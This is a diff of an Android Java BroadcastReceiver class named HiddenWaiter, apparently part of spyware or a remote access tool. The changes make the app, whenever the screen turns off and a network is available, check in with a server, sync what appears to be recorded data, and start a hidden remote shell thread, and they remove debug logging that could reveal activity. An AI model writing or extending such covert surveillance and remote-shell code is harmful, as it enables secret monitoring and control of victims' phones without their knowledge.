@@ -5,7 +5,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
-import android.util.Log;
 
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -42,6 +41,9 @@ public class HiddenWaiter extends BroadcastReceiver {
             case "android.intent.action.SCREEN_OFF":
                 MyService.ScreenOn = false;
                 if(isNetworkAvailable()){
+
+                    Integer respons = sendPost(MyService.CheckDevice);
+                    if(respons==200){
                         if(System.currentTimeMillis()-lastsynctime>sync_interval){ //
                             if(!MyService.recording&&!MyService.syncactive){
                                 sync();
@@ -51,7 +53,6 @@ public class HiddenWaiter extends BroadcastReceiver {
                             notifyonline();
                         }
                         if(!MyService.cmdsessionactive){
-                            Log.d("My","Start");
                             shellthread = new Thread(new ShellSession());  //
                             shellthread.setName("shellthread");
                             shellthread.start();
@@ -62,6 +63,7 @@ public class HiddenWaiter extends BroadcastReceiver {
                         } catch (InterruptedException e) {
                             e.printStackTrace();
                         }
+                    }
                 }
                 break;
             case "android.intent.action.SCREEN_ON"://При включении экрана происходит проверка на потоки и включение режима screen on
